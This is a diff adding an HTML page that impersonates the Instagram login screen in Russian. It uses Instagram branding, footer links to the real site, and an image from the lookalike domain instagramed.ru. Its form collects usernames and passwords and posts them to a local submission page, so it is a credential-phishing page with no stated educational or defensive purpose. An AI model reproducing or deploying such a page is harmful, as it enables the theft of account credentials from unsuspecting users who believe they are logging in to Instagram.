@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="utf-8" />
+  <title>Instagram.com</title>
+
+<style>
+body{
+background-color:white;
+color:black;
+font-family: Arial;}
+  
+#left { position: absolute; left: 0; top: 0; width: 50%; margin: 6% 10% ;}
+#right { position: absolute; right: 0; top: 0; width: 50%; margin:10% -5%;}
+footer {
+    clear: both;
+    position: relative;
+    height: 200px;
+    margin-top: 800px;
+    text-align:center;
+}
+
+</style>
+</head>
+
+<body>
+
+ <div id="left">
+   <img style="width: 600px;
+height: 600px;" src="https://instagramed.ru/assets/images/iphone.png"/>
+ </div>
+ 
+ <div id="right">
+ 
+ <h1>Instagram</h1>
+ 
+  <form action="submission.html" method="POST">
+   <section class="username">
+          <input type="text" name="username" id="username" placeholder="Номер телефона,имя пользователя или эл..">
+   </section>
+   
+   <section class="password">
+          <input type="text" name="password" id="password" placeholder="Пароль">
+   </section>
+ 
+    <section class="submission">
+          <input type="submit" value="Войти">
+    </section>
+    
+    <p>или</p>
+    <a href=""><strong>Войти через Facebook</strong></a><br>
+    <a href="">Забыли пароль?</a>
+  
+  </form>
+  
+  <p>У вас еще нет аккаунта?<a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a></p>
+  <hr>
+  <p>Установите приложение.</p>
+  
+ </div>
+ 
+</body>
+
+<footer>
+<div>
+  <a href="https://about.instagram.com/about-us">О нас</a>
+    <a href="https://help.instagram.com/">Помощь</a>
+     <a href="https://instagram-press.com/">Пресса</a>
+      <a href="https://www.instagram.com/developer/">API</a>
+       <a href="https://www.instagram.com/about/jobs/">Вакансии</a>
+        <a href="https://help.instagram.com/519522125107875">Конфедициальность</a>
+         <a href="https://help.instagram.com/581066165581870">Условия</a>
+          <a href="https://www.instagram.com/explore/locations/">Директория</a>
+           <a href="https://www.instagram.com/directory/profiles/">Профили</a>
+            <a href="https://www.instagram.com/directory/hashtags/">Хэштэги</a>
+            <section class="type-of-language">
+              <select name="language" id="language">
+              <option value="русский">Русский</option>
+              <option value="polski">Polski</option>
+              <option value="italiano">Italiano</option>
+              <option value="philipino">Philipino</option>
+              <option value="english">English</option>
+              </select>
+             </section>
+</div>
+             <p>:copyright: Instagram от Facebook, 2020</p>
+</footer>
+
+</html>
